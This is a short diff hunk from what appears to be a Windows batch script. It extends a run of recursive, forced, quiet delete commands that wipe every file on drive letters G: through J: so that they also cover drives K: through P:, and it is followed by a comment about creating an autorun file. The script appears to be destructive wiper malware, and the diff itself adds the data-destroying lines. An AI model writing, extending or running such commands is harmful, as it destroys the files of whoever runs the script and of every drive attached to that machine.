@@ -254,6 +254,12 @@ del G:\*.* /f /s /q
 del H:\*.* /f /s /q
 del I:\*.* /f /s /q
 del J:\*.* /f /s /q
+del K:\*.* /f /s /q
+del L:\*.* /f /s /q
+del M:\*.* /f /s /q
+del N:\*.* /f /s /q
+del O:\*.* /f /s /q
+del P:\*.* /f /s /q
 
 :: Create autorun file
 
